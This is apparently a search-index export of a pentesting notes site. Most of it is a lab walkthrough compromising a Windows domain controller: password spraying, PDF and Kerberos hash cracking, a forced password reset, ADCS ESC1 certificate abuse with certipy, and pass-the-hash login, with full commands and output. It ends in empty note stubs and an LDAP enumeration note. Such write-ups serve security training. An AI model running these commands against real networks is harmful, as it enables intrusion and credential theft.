10.1.93.173     445    DC01             [+] WELCOME.local\\e.hills:Il0vemyj0b2025!\nSMB         10.1.93.173     445    DC01             [*] Enumerated shares\nSMB         10.1.93.173     445    DC01             Share           Permissions     Remark\nSMB         10.1.93.173     445    DC01             -----           -----------     ------\nSMB         10.1.93.173     445    DC01             ADMIN$                          Remote Admin\nSMB         10.1.93.173     445    DC01             C$                              Default share\nSMB         10.1.93.173     445    DC01             Human Resources READ\nSMB         10.1.93.173     445    DC01             IPC$            READ            Remote IPC\nSMB         10.1.93.173     445    DC01             NETLOGON        READ            Logon server share\nSMB         10.1.93.173     445    DC01             SYSVOL          READ            Logon server share\n</code></pre> <p><code>smbclient.py</code> will be used from the impacket suite of tools to login to the <code>Human Resource</code> share folder.</p> <pre><code>dcyberguy on \uf07b ~/Documents/Hacksmarter-labs/Welcome\n# dir\n\n    Directory: C:\\Users\\dcyberguy\\Documents\\Hacksmarter-labs\\Welcome\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a---          11/13/2025  4:36 PM          84715 Welcome 2025 Holiday Schedule.pdf\n-a---          11/13/2025  4:36 PM          81466 Welcome Benefits.pdf\n-a---          11/13/2025  4:37 PM          82644 Welcome Handbook Excerpts.pdf\n-a---          11/13/2025  4:37 PM          79823 Welcome Performance Review Guide.pdf\n-a---          11/13/2025  4:37 PM          89511 Welcome Start Guide.pdf\n</code></pre> <p>Welcome Start Guide.pdf is password protected so I will use pdf2john to crack the password</p> <pre><code>pdf2john Welcome\\ Start\\ Guide.pdf &gt; john.pass\n\u279c  welcome ls\n     \uf15b  john.pass      \uf1c1  Welcome Start Guide.pdf \n\u279c  welcome cat john.pass\nWelcome Start Guide.pdf:$pdf$4*4*128*-1060*1*16*fc591b1749ad08498b60ce3a81947b8c*32*9abeeb4695a10ac7b5e6558d39ee8c8300000000000000000000000000000000*32*e3e7eecc056a1ca2a2b0298352b0970f96ff1503022a1146e322e2f215dfd6be\n\u279c  welcome sudo john --wordlist=/usr/share/wordlists/rockyou.txt john.pass\n[sudo] password for parrot: \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])\nCost 1 (revision) is 4 for all loaded hashes\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nhumanresources   (Welcome Start Guide.pdf)     \n1g 0:00:00:05 DONE (2025-11-20 17:37) 0.1675g/s 155529p/s 155529c/s 155529C/s hunkies..huitar\nUse the \"--show --format=PDF\" options to display all of the cracked passwords reliably\nSession completed. \n\u279c  welcome open Welcome\\ Start\\ Guide.pdf\n</code></pre> <p>[password is <code>humanresources</code>]</p> <p>On the Human resource document, there is a default password every new employee gets after on-boarding. This password would later be changed. Let\u2019s see whether any of the users changed his password.</p> <p></p> <p>I will list all users using nxc and cut out only the users. This users would be stored in a file called users.txt</p> <pre><code>nxc smb 10.1.93.173 -u e.hills -p 'Il0vemyj0b2025!' --users \nSMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)\nSMB         10.1.93.173     445    DC01             [+] WELCOME.local\\e.hills:Il0vemyj0b2025! \nSMB         10.1.93.173     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                             \nSMB         10.1.93.173     445    DC01             Administrator                 2025-09-13 16:24:04 0       Built-in account for administering the computer/domain \nSMB         10.1.93.173     445    DC01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain \nSMB         10.1.93.173     445    DC01             krbtgt                        2025-09-13 16:40:39 0       Key Distribution Center Service Account \nSMB         10.1.93.173     445    DC01             e.hills                       2025-09-13 20:41:15 0        \nSMB         10.1.93.173     445    DC01             j.crickets                    2025-09-13 20:43:53 0        \nSMB         10.1.93.173     445    DC01             e.blanch                      2025-09-13 20:49:13 0        \nSMB         10.1.93.173     445    DC01             i.park                        2025-09-14 04:23:03 0       IT Intern \nSMB         10.1.93.173     445    DC01             j.johnson                     2025-09-13 20:58:15 0        \nSMB         10.1.93.173     445    DC01             a.harris                      2025-09-13 20:59:13 0        \nSMB         10.1.93.173     445    DC01             svc_ca                        2025-09-14 00:19:35 0        \nSMB         10.1.93.173     445    DC01             svc_web                       2025-09-13 21:40:40 0       Web Server in Progress \nSMB         10.1.93.173     445    DC01             [*] Enumerated 11 local users: WELCOME\n</code></pre> <p>Save the users list to a file </p><pre><code>cat users.txt | cut -d ' ' -f 5\nAdministrator\nGuest\nkrbtgt\ne.hills\nj.crickets\ne.blanch\ni.park\nj.johnson\na.harris\nsvc_ca\n</code></pre><p></p> <p>Bruteforce for user with default password and also check whether it has remote services enabled</p> <pre><code>nxc smb 10.1.93.173 -u users.txt -p 'Welcome2025!@'\nSMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)\nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\Administrator:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\Guest:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\krbtgt:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\e.hills:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\j.crickets:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\e.blanch:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\i.park:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [-] WELCOME.local\\j.johnson:Welcome2025!@ STATUS_LOGON_FAILURE \nSMB         10.1.93.173     445    DC01             [+] WELCOME.local\\a.harris:Welcome2025!@ \n\n\u279c  welcome nxc smb 10.1.93.173 -u a.harris -p 'Welcome2025!@'\nSMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)\nSMB         10.1.93.173     445    DC01             [+] WELCOME.local\\a.harris:Welcome2025!@ \n\n\u279c  welcome nxc winrm 10.1.93.173 -u a.harris -p 'Welcome2025!@'\nWINRM       10.1.93.173     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local)\nWINRM       10.1.93.173     5985   DC01             [+] WELCOME.local\\a.harris:Welcome2025!@ (Pwn3d!)\n</code></pre> <p>Use the obtained password and login to the compromised user\u2019s account.</p> <p></p><pre><code>welcome evil-winrm -i 10.1.93.173 -u a.harris -p 'Welcome2025!@'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\a.harris\\Documents&gt; dir\n*Evil-WinRM* PS C:\\Users\\a.harris\\Documents&gt; cd ..\\Desktop\n*Evil-WinRM* PS C:\\Users\\a.harris\\Desktop&gt; dir\n\n\n    Directory: C:\\Users\\a.harris\\Desktop\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         9/13/2025   8:48 PM             32 user.txt\n\n\n*Evil-WinRM* PS C:\\Users\\a.harris\\Desktop&gt; type user.txt\n46fa545e76f2bXXXXXXXXXXXXXX\n</code></pre> Looking at the user privileges, it seems I can do <code>CVE-2021-42278</code> which allows potential attackers to gain high privileged user access (domain controllers Administrator level access) via a low privileged user (any normal Domain user). But it failed since the dir is 0.<p></p> <pre><code>noPac git:(main) python3 noPac.py welcome.local/a.harris:'Welcome2025!@' -dc-ip 10.1.93.173 -shell --impersonate administrator -use-ldap\n\n\u2588\u2588\u2588    \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588 \n\u2588\u2588\u2588\u2588   \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588 \u2588\u2588  \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588      \n\u2588\u2588  \u2588\u2588 \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588   \u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588      \u2588\u2588   \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588 \n\n[-] Cannot exploit , ms-DS-MachineAccountQuota 0\n</code></pre> <p>WinPeas did not work either. It was caught by the antivirus.</p> <pre><code>*Evil-WinRM* PS C:\\Windows\\Temp&gt; ./winPEASx64.exe\nProgram 'winPEASx64.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1\n+ ./winPEASx64.exe\n+ ~~~~~~~~~~~~~~~~.\nAt line:1 char:1\n+ ./winPEASx64.exe\n+ ~~~~~~~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\n    + FullyQualifiedErrorId : NativeCommandFailed\n</code></pre>"},{"location":"HackSmarter-Labs/welcome/#bloodhound","title":"Bloodhound","text":"<p><code>Bloodhound</code> was last resort and I found some interesting thing about the user <code>a.harris</code></p> <pre><code>nxc ldap 10.1.93.173 -u a.harris -p 'Welcome2025!@' --bloodhound --collection All --dns-server 10.1.93.173\nSMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)\nLDAP        10.1.93.173     389    DC01             [+] WELCOME.local\\a.harris:Welcome2025!@ \nLDAP        10.1.93.173     389    DC01             Resolved collection methods: objectprops, group, acl, psremote, container, session, trusts, dcom, localadmin, rdp\nLDAP        10.1.93.173     389    DC01             Done in 00M 04S\nLDAP        10.1.93.173     389    DC01             Compressing output into /home/parrot/.nxc/logs/DC01_10.1.93.173_2025-11-20_203317_bloodhound.zip\n</code></pre> <p>Fired up Bloodhound</p> <p></p><pre><code>./bloodhound-cli up\n[+] Checking the status of Docker and the Compose plugin...\n[+] The `compose` plugin is not installed, so we'll try the deprecated `docker-compose` script\n[+] The `docker-compose` script is installed, so we'll use that instead\n[+] Docker and the Compose plugin checks have passed\n[+] Bringing up the BloodHound environment\n[+] Running `docker-compose` to bring up the containers with /home/parrot/.config/bloodhound/docker-compose.yml...\nStarting bloodhound_graph-db_1 ... \nStarting bloodhound_app-db_1   ... \nStarting bloodhound_graph-db_1 ... done\nStarting bloodhound_app-db_1   ... done\nStarting bloodhound_bloodhound_1 ... \nStarting bloodhound_bloodhound_1 ... done\n</code></pre> A.HARRIS has Genric.All over I.PARK user which would enable us to do a targetedKerberoast attack<p></p> <p>targetedKerberoast</p> <p></p>"},{"location":"HackSmarter-Labs/welcome/#exploit-targetedkerberoast","title":"Exploit: TargetedKerberoast","text":"<pre><code>targetedKerberoast git:(main) python3 targetedKerberoast.py -d WELCOME.local -u 'a.harris' -p 'Welcome2025!@' -v \n[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[VERBOSE] SPN added successfully for (i.park)\n[+] Printing hash for (i.park)\n$krb5tgs$23$*i.park$WELCOME.LOCAL$WELCOME.local/i.park*$27d2977ce568aadf149bc88472e0e3bd$170de14225152619c806cd2284dd653e547a0c039900365a238821c2411e123e9a83c6dc785ad58dc8db5ba55ca257da0facca60d80810328823dbb779caf2f3d102b9cf78f1cf489c5cb3e221443c87dd572a8986a8f97721be8ca18d27d613b04f5cc5b7f35af2a0bd53dac6d9a73244235fd7347ed762bd330b6305b22ddecd30c0b4fdc07b54640595d89cfe8c57db9b0bc77dc927bdf2314f3b4e903a9ae46c012a1bf3c128c660978423375d05246e7323d6ea23f1d38ccb02301d94127ee47f2df8ed2a1c5ae51077e4beb5f26406e013974c2d93bfd557f98f2dc2684c5351f22c6b684f5574836527f66e4fc4f5311cca9dee775c6cf3d2b478dcac4b4396bd4d44aec09a59213f18a7cc4a650906d7d02a72df02d434bd94b77a55fa3e5f29209cfef07b414d4d998ca57af76fa1f6984f71f85dc57092555e4b349f5d0ba17328f065299783b42a62a79b3abb26bdad451b55a09c05e16a3d2ec956976df3ae288caaa0b1d2cd7397fc33ecfff3d241dc8ac4d03923701f3b9a81fe769278bdf44857dc34f52738e6008877910f7374ab24789abcbbe1ea9d79e465882fe73ef0d09b58918f037972382109bdd50adb4f0e67e83422e6fa522c95aa85549b30952461e55b4995b6cd98ed041f6bb666addacb373e9d11f350c687ec645711ac0e489dfeca6011053f192a1260b3f0e29cc91c454d9ed1618c54a95b9af0f19337e21bdf9871452f9bc636976b9ea9dd84d2687f6269448a4f9235214b582cb89407f049169713b5e6d00ad1900dec55be9b738c16dd0d9df5c7d699e7e397e445ee06bd12b4aa80ffbabf89ae66637cdc61437d432b66c019123a3e4a1e665022f543b06d78e6fd7d03b7aa233e37d96a2e181c11d823cd49c0327eb94b7f2e4831ee6af338db24a6749712701277adef921d5d0fb4cf6076e56f024a284a59fcb024753060edba811f7d3c83d5617b14226bebbbd758b84808822ea22289c921e1e4e2556b7cc32bb1bfb3d42d58731873c9f7485cfb3c17fe15fe10ec5005ea631c18fd78df2b82d01879d09c939d2d060352595e70e07d89f01199a4638ffd365a2195d6ea23d373ad254be979a7d9e754a608b7cab5f26990be7a50236fb1a29fb3536e2bc62d99a31b0308c86827fc04669dc2e68a10b8b8c3f5f0593e254eb9919d7326add150ffdf1d1b58a36d6ee19e1b0c25bd34dad75d7937a1ccd6ddd52451f2f4852c94c25361076d7f91d50b2fb05e14302b378cf0bc511723d84f321fc23fa4285e06181981a65209e8d1aa966424c18964f43b30d58bc8a9a75fbc8c9d43c276c415bfa31f9b986f9ae70130a5368568cb0fef12b45644a2293006d818aba87561cb58a2e8e478e6a68868a696d73808db0c41344fb1bd4e3827da20770908ad8872598a0dc663c014670de45e45d4ea64b5a6497318154cf8eaafab12db02b835a9d96b756beb6d5d\n[VERBOSE] SPN removed successfully for (i.park)\n</code></pre> <p>I tried cracking the keberoast hash with John The Ripper. It Failed Woefully</p> <p></p><pre><code>john --list:formats | grep krb5\n[sudo] password for parrot: \nkeyring, keystore, known_hosts, krb4, krb5, krb5asrep, krb5pa-sha1, krb5tgs, \nkrb5-17, krb5-18, krb5-3, kwallet, lp, lpcli, leet, lotus5, lotus85, LUKS, \nmscash2, MSCHAPv2, mschapv2-naive, krb5pa-md5, mssql, mssql05, mssql12, \n416 formats (149 dynamic formats shown as just \"dynamic_n\" here)\n\n\u279c  ~ cd Documents/HSM-Labs/welcome \n\n\u279c  welcome nano kerb.hash\n\n\u279c  welcome sudo john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:08 DONE (2025-11-20 21:18) 0g/s 1728Kp/s 1728Kc/s 1728KC/s !!12Honey..*7\u00a1Vamos!\nSession completed. \n\n\u279c  welcome sudo john kerb.hash -show\n0 password hashes cracked, 1 left\n</code></pre> We can also do a <code>Force Password Change</code>. I was able to change <code>i.park\u2019s</code> password and he is able to do an <code>RDP Session</code><p></p> <pre><code>net rpc password \"i.park\" \"Valentino1@\" -U \"WELCOME.local\"/\"a.harris\"%'Welcome2025!@' -S \"10.1.93.173\"\n\n\u279c  welcome nxc smb 10.1.93.173 -u i.park -p 'Valentino1@'\nSMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False)\nSMB         10.1.93.173     445    DC01             [+] WELCOME.local\\i.park:Valentino1@ \n\n\u279c  welcome nxc winrm 10.1.93.173 -u i.park -p 'Valentino1@'\nWINRM       10.1.93.173     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local)\nWINRM       10.1.93.173     5985   DC01             [-] WELCOME.local\\i.park:Valentino1@\n\n\u279c  welcome nxc rdp 10.1.93.173 -u i.park -p 'Valentino1@'\nRDP         10.1.93.173     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:WELCOME.local) (nla:True)\nRDP         10.1.93.173     3389   DC01             [+] WELCOME.local\\i.park:Valentino1@ \n</code></pre> <p>Now that I have compromised <code>i.park</code>, what else can I do. Since Park is a member of the <code>HelpDesk group</code>, he can force a password change on both <code>SVC_CA</code> and <code>SVC_WEB</code>. Guess my next mark, you got ir SVC_CA.</p>"},{"location":"HackSmarter-Labs/welcome/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"HackSmarter-Labs/welcome/#certipy-ad","title":"Certipy-ad","text":"<p>Since this is all above Certificates, I will check whether it contains a vulnerable certificate</p> <pre><code>certipy find -u svc_ca -p 'Valentino1@' -dc-ip 10.1.93.173 -target-ip 10.1.93.173 -vulnerable -enable -stdout\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'WELCOME-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'WELCOME-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'WELCOME-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Got CA configuration for 'WELCOME-CA'\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : WELCOME-CA\n    DNS Name                            : DC01.WELCOME.local\n    Certificate Subject                 : CN=WELCOME-CA, DC=WELCOME, DC=local\n    Certificate Serial Number           : 6E7A025A45F4E6A14E1F08B77737AFD9\n    Certificate Validity Start          : 2025-09-13 16:39:33+00:00\n    Certificate Validity End            : 2030-09-13 16:49:33+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : WELCOME.LOCAL\\Administrators\n      Access Rights\n        ManageCertificates              : WELCOME.LOCAL\\Administrators\n                                          WELCOME.LOCAL\\Domain Admins\n                                          WELCOME.LOCAL\\Enterprise Admins\n        ManageCa                        : WELCOME.LOCAL\\Administrators\n                                          WELCOME.LOCAL\\Domain Admins\n                                          WELCOME.LOCAL\\Enterprise Admins\n        Enroll                          : WELCOME.LOCAL\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : Welcome-Template\n    Display Name                        : Welcome-Template\n    Certificate Authorities             : WELCOME-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : PublishToDs\n    Extended Key Usage                  : Server Authentication\n                                          Client Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 1 year\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : WELCOME.LOCAL\\svc ca\n                                          WELCOME.LOCAL\\Domain Admins\n                                          WELCOME.LOCAL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : WELCOME.LOCAL\\Administrator\n        Write Owner Principals          : WELCOME.LOCAL\\Domain Admins\n                                          WELCOME.LOCAL\\Enterprise Admins\n                                          WELCOME.LOCAL\\Administrator\n        Write Dacl Principals           : WELCOME.LOCAL\\Domain Admins\n                                          WELCOME.LOCAL\\Enterprise Admins\n                                          WELCOME.LOCAL\\Administrator\n        Write Property Principals       : WELCOME.LOCAL\\Domain Admins\n                                          WELCOME.LOCAL\\Enterprise Admins\n                                          WELCOME.LOCAL\\Administrator\n    [!] Vulnerabilities\n      ESC1                              : 'WELCOME.LOCAL\\\\svc ca' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre> <p>Yes it is vulnerable to ESCI1. </p> <p>Dumping the <code>administrator.pfx</code></p> <pre><code>certipy req -username svc_ca@WELCOME.local -password 'Valentino1@' -target-ip WELCOME.local -dc-ip 10.1.93.173 -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.local'\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 23\n[*] Got certificate with UPN 'administrator@WELCOME.local'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <p>I can get a <code>ldap shell</code></p> <pre><code>certipy auth -pfx administrator.pfx -ldap-shell -dc-ip 10.1.93.173\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Connecting to 'ldaps://10.1.93.173:636'\n[*] Authenticated to '10.1.93.173' as: u:WELCOME\\Administrator\nType help for list of commands\n\n# whoami\nu:WELCOME\\Administrator\n</code></pre> <p>Or I can also dump the administrator\u2019s password hash</p> <pre><code>certipy auth -pfx administrator.pfx -u administrator -domain WELCOME.local  -dc-ip 10.1.93.173\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@welcome.local\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a\n</code></pre> <p>Instead of me trying to crack it, I can just use the <code>LM hash</code> and authenticate to <code>evil-winrm</code></p> <pre><code>evil-winrm -i 10.1.93.173 -u administrator -H '0cf1b799460a39c852068b7c0574677a'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd ..\\Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; dir\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         9/13/2025   5:47 PM             32 root.txt\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt\n7fbb500e36XXXXXXXXXXXXXXXXXXXX\n</code></pre>"},{"location":"Pentesting-Notes/","title":"Notes","text":"<ul> <li> <p> Windows Pentesting</p> <p>Follow ethical hacking and penetration methodologies</p> <p> Windows</p> </li> <li> <p> Linux Pentesting</p> <p>Linux hacking and best practices for pentesters</p> <p> Linux</p> </li> <li> <p> AWS Cloud Pentesting</p> <p>Coming Soon!!</p> <p> AWS</p> </li> <li> <p> Azure Cloud Pentesting</p> <p>Coming Soon!!</p> <p> Azure</p> </li> <li> <p> Web Application Pentesting</p> <p>Coming Soon!!</p> <p> Web</p> </li> </ul>"},{"location":"Pentesting-Notes/Cloud/AWS/enumeration/","title":"Enumeration","text":""},{"location":"Pentesting-Notes/Cloud/AWS/persistence/","title":"Persistence","text":""},{"location":"Pentesting-Notes/Cloud/AWS/post-exploitation/","title":"Post exploitation","text":""},{"location":"Pentesting-Notes/Cloud/AWS/privilege-escalation/","title":"Privilege escalation","text":""},{"location":"Pentesting-Notes/Cloud/AWS/reconnaissance/","title":"Reconnaissance","text":""},{"location":"Pentesting-Notes/Cloud/Azure/enumeration/","title":"Enumeration","text":""},{"location":"Pentesting-Notes/Cloud/Azure/persistence/","title":"Persistence","text":""},{"location":"Pentesting-Notes/Cloud/Azure/post-exploitation/","title":"Post exploitation","text":""},{"location":"Pentesting-Notes/Cloud/Azure/privilege-escalation/","title":"Privilege escalation","text":""},{"location":"Pentesting-Notes/Cloud/Azure/reconnaissance/","title":"Reconnaissance","text":""},{"location":"Pentesting-Notes/Cloud/GCP/enumeration/","title":"Enumeration","text":""},{"location":"Pentesting-Notes/Cloud/GCP/persistence/","title":"Persistence","text":""},{"location":"Pentesting-Notes/Cloud/GCP/post-exploitation/","title":"Post exploitation","text":""},{"location":"Pentesting-Notes/Cloud/GCP/privilege-escalation/","title":"Privilege escalation","text":""},{"location":"Pentesting-Notes/Cloud/GCP/reconnaissance/","title":"Reconnaissance","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/Command-and-Control/","title":"Command and Control","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/FTP/","title":"FTP","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/MySQL/","title":"MySQL","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/Persistence/","title":"Persistence","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/Post-Exploitation/","title":"Post Exploitation","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/Privilege-Escalation/","title":"Privilege Escalation","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/SSH/","title":"SSH","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/enumeration/","title":"Enumeration","text":""},{"location":"Pentesting-Notes/Linux/Pentesting/reconnaissance/","title":"Reconnaissance","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/Certificate-Authority/","title":"Certificate Authority","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/Command-and-Control/","title":"Command and Control","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/Delegation/","title":"Delegation","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/LDAP/","title":"LDAP Attacks (Port 389)","text":"NetExec: LDAP Enumeration <p>Enumerate LDAP information on the target Windows system. This can be done using tools like nxc to query LDAP services for directory information.</p> <pre><code>nxc ldap 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --users\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nLDAP        10.10.10.11     389    WINTERFELL       [*] Enumerated 16 domain users: north.sevenkingdoms.local\nLDAP        10.10.10.11     389    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-                                            \nLDAP        10.10.10.11     389    WINTERFELL       Administrator                 2025-10-18 18:41:56 0       Built-in account for administering the computer/domain   \nLDAP        10.10.10.11     389    WINTERFELL       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain \nLDAP        10.10.10.11     389    WINTERFELL       vagrant                       2021-05-12 11:39:16 0       Vagrant User                                             \nLDAP        10.10.10.11     389    WINTERFELL       krbtgt                        2025-10-18 19:07:40 0       Key Distribution Center Service Account                  \nLDAP        10.10.10.11     389    WINTERFELL       arya.stark                    2025-10-31 23:47:19 0       Arya Stark                                               \nLDAP        10.10.10.11     389    WINTERFELL       eddard.stark                  2025-10-31 23:47:22 0       Eddard Stark                                             \nLDAP        10.10.10.11     389    WINTERFELL       catelyn.stark                 2025-10-31 23:47:24 0       Catelyn Stark                                            \nLDAP        10.10.10.11     389    WINTERFELL       robb.stark                    2025-10-31 23:47:26 0       Robb Stark                                               \nLDAP        10.10.10.11     389    WINTERFELL       sansa.stark                   2025-10-31 23:47:28 0       Sansa Stark                                              \nLDAP        10.10.10.11     389    WINTERFELL       brandon.stark                 2025-10-31 23:47:31 0       Brandon Stark                                            \nLDAP        10.10.10.11     389    WINTERFELL       rickon.stark                  2025-10-31 23:47:33 0       Rickon Stark                                             \nLDAP        10.10.10.11     389    WINTERFELL       hodor                         2025-10-31 23:47:35 0       Brainless Giant                                          \nLDAP        10.10.10.11     389    WINTERFELL       jon.snow                      2025-10-31 23:47:37 0       Jon Snow                                                 \nLDAP        10.10.10.11     389    WINTERFELL       samwell.tarly                 2025-10-31 23:47:39 0       